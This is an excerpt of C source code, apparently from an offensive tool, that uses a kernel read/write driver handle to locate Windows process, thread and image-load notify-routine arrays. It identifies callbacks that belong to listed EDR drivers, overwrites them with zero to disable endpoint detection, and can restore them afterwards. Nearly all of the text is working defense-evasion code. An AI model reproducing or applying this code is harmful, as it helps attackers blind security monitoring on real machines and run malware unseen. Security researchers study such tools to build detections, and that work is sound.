...
BOOL isDriverEDR(TCHAR* driver) {
    for (int i = 0; i < _countof(EDR_DRIVERS); ++i) {
        if (_tcscmp(driver, EDR_DRIVERS[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
...
void OperateNotifyRoutines(DWORD64 NotifyRoutineAddress, struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL remove, BOOL verbose) {
    HANDLE Device = GetDriverHandle();

    int CurrentEDRDriversCount = 0;
    for (int i = 0; i < PSP_MAX_CALLBACKS; ++i) {
        DWORD64 callback_struct = ReadMemoryDWORD64(Device, NotifyRoutineAddress + (i * sizeof(DWORD64)));
        if (callback_struct != 0) {
            DWORD64 callback = (callback_struct & ~0b1111) + 8;
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            TCHAR* driver = FindDriver(cbFunction, verbose);
            ...
            if (driver && isDriverEDR(driver)) {
                ...
                newFoundDriver.callback_addr = callback_addr;
                newFoundDriver.callback_struct = callback_struct;
                newFoundDriver.callback_func = cbFunction;

                if (!remove) {
                    if (verbose) {
                        _tprintf(TEXT("[+] Found EDR driver callback: \"%s\" [callback addr: 0x%I64x | callback struct: 0x%I64x | callback function: 0x%I64x]\n"),
                            driver, callback_addr, callback_struct, cbFunction);
                    }
                    newFoundDriver.removed = FALSE;
                }
                else {
                    if (verbose) {
                        _tprintf(TEXT("[+] Removing EDR driver callback: \"%s\" [callback addr: 0x%I64x | callback struct: 0x%I64x | callback function: 0x%I64x]\n"),
                            driver, callback_addr, callback_struct, cbFunction);
                    }
                    WriteMemoryDWORD64(Device, callback_addr, 0x0000000000000000);
                    newFoundDriver.removed = TRUE;
                }
                edrDrivers->EDR_CALLBACKS[edrDrivers->index + CurrentEDRDriversCount] = newFoundDriver;
...
void RestoreEDRCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers) {
    ...
    for (DWORD i = 0; i < edrDrivers->index; ++i) {
        if (edrDrivers->EDR_CALLBACKS[i].removed == TRUE) {
            _tprintf(TEXT("[+] Restoring callback of EDR driver \"%s\" [callback addr: 0x%I64x | callback struct: 0x%I64x | callback function: 0x%I64x]\n"),
                edrDrivers->EDR_CALLBACKS[i].driver,
                edrDrivers->EDR_CALLBACKS[i].callback_addr,
                edrDrivers->EDR_CALLBACKS[i].callback_struct,
                edrDrivers->EDR_CALLBACKS[i].callback_func);
            WriteMemoryDWORD64(Device, edrDrivers->EDR_CALLBACKS[i].callback_addr, edrDrivers->EDR_CALLBACKS[i].callback_struct);
        }
    }
...
DWORD64 GetPspCreateProcessNotifyRoutineAddress(void) {
    ...
    DWORD64 PspCreateProcessNotifyRoutineOffset = ntoskrnlOffsets.st.pspCreateProcessNotifyRoutine;
...
void EnumPspCreateProcessNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspCreateProcessNotifyRoutineAddress = GetPspCreateProcessNotifyRoutineAddress();
    if (verbose == TRUE) { _tprintf(TEXT("[+] Enumerating process creation callbacks\n")); }
    _tprintf(TEXT("[+] PspCreateProcessNotifyRoutine: 0x%I64x\n"), PspCreateProcessNotifyRoutineAddress);
    OperateNotifyRoutines(PspCreateProcessNotifyRoutineAddress, edrDrivers, FALSE, verbose);
}

void RemoveEDRProcessNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspCreateProcessNotifyRoutineAddress = GetPspCreateProcessNotifyRoutineAddress();
    if (verbose == TRUE) { _tprintf(TEXT("[+] Removing EDR process creation callbacks\n")); }
    _tprintf(TEXT("[+] PspCreateProcessNotifyRoutine: 0x%I64x\n"), PspCreateProcessNotifyRoutineAddress);
    OperateNotifyRoutines(PspCreateProcessNotifyRoutineAddress, edrDrivers, TRUE, verbose);
}
...
DWORD64 GetPspCreateThreadNotifyRoutineAddress(void) {
    DWORD64 NtosKrnlbaseAddress = FindNtoskrnlBaseAddress();
    DWORD64 PspCreateThreadNotifyRoutineOffset = ntoskrnlOffsets.st.pspCreateThreadNotifyRoutine;
    DWORD64 PspCreateThreadNotifyRoutineAddress = NtosKrnlbaseAddress + PspCreateThreadNotifyRoutineOffset;
...
void EnumPspCreateThreadNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspCreateThreadNotifyRoutineAddress = GetPspCreateThreadNotifyRoutineAddress();
    if (verbose == TRUE) { _tprintf(TEXT("[+] Enumerating threads creation callbacks\n")); }
    _tprintf(TEXT("[+] PspCreateThreadNotifyRoutine: 0x%I64x\n"), PspCreateThreadNotifyRoutineAddress);
    OperateNotifyRoutines(PspCreateThreadNotifyRoutineAddress, edrDrivers, FALSE, verbose);
}

void RemoveEDRThreadNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspCreateThreadNotifyRoutineAddress = GetPspCreateThreadNotifyRoutineAddress();
    if (verbose == TRUE) { _tprintf(TEXT("[+] Removing EDR threads creation callbacks\n")); }
    _tprintf(TEXT("[+] PspCreateThreadNotifyRoutine: 0x%I64x\n"), PspCreateThreadNotifyRoutineAddress);
    OperateNotifyRoutines(PspCreateThreadNotifyRoutineAddress, edrDrivers, TRUE, verbose);
}
...
DWORD64 GetPspLoadImageNotifyRoutineAddress(void) {
    DWORD64 NtoskrnlBaseAddress = FindNtoskrnlBaseAddress();
    DWORD64 PspLoadImageNotifyRoutineOffset = ntoskrnlOffsets.st.pspLoadImageNotifyRoutine;
    DWORD64 PspLoadImageNotifyRoutineAddress = NtoskrnlBaseAddress + PspLoadImageNotifyRoutineOffset;
...
void EnumPspLoadImageNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspLoadImageNotifyRoutineAddress = GetPspLoadImageNotifyRoutineAddress();
    ...
    OperateNotifyRoutines(PspLoadImageNotifyRoutineAddress, edrDrivers, FALSE, verbose);
}

void RemoveEDRImageNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 PspLoadImageNotifyRoutineAddress = GetPspLoadImageNotifyRoutineAddress();
    if (verbose == TRUE) { _tprintf(TEXT("[+] Removing EDR image loading callbacks\n")); }
    _tprintf(TEXT("[+] PspLoadImageNotifyRoutine: 0x%I64x\n"), PspLoadImageNotifyRoutineAddress);
    OperateNotifyRoutines(PspLoadImageNotifyRoutineAddress, edrDrivers, TRUE, verbose);
}
...
DWORD64 GetPsp_X_NotifyRoutineAddress(enum NtoskrnlOffsetType nrt) {
    DWORD64 Ntoskrnlbaseaddress = FindNtoskrnlBaseAddress();
    DWORD64 Psp_X_NotifyRoutineOffset = ntoskrnlOffsets.ar[nrt];
    DWORD64 Psp_X_NotifyRoutineAddress = Ntoskrnlbaseaddress + Psp_X_NotifyRoutineOffset;
    return Psp_X_NotifyRoutineAddress;
}

void EnumPsp_X_NotifyRoutine(enum NtoskrnlOffsetType nrt, struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 Psp_X_NotifyRoutineAddress = GetPsp_X_NotifyRoutineAddress(nrt);
    if (verbose == TRUE) { _tprintf(TEXT("[+] Enumerating %s callbacks\n"), notifyRoutineTypeStrs[nrt]); }
    _tprintf(TEXT("[+] Psp%sNotifyRoutine: 0x%I64x\n"), notifyRoutineTypeNames[nrt], Psp_X_NotifyRoutineAddress);
    OperateNotifyRoutines(Psp_X_NotifyRoutineAddress, edrDrivers, FALSE, verbose);
}

void RemoveEDR_X_Callbacks(enum NtoskrnlOffsetType nrt, struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    DWORD64 Psp_X_NotifyRoutineAddress = GetPsp_X_NotifyRoutineAddress(nrt);
    if (verbose == TRUE) { _tprintf(TEXT("[+] Removing %s callbacks\n"), notifyRoutineTypeStrs[nrt]); }
    _tprintf(TEXT("[+] Psp%sNotifyRoutine: 0x%I64x\n"), notifyRoutineTypeNames[nrt], Psp_X_NotifyRoutineAddress);
    OperateNotifyRoutines(Psp_X_NotifyRoutineAddress, edrDrivers, TRUE, verbose);
}
...
void EnumAllEDRKernelCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose) {
    EnumPsp_X_NotifyRoutine(CREATE_PROCESS_ROUTINE, edrDrivers, verbose);
    EnumPsp_X_NotifyRoutine(CREATE_THREAD_ROUTINE,  edrDrivers, verbose);
    EnumPsp_X_NotifyRoutine(LOAD_IMAGE_ROUTINE,     edrDrivers, verbose);
}
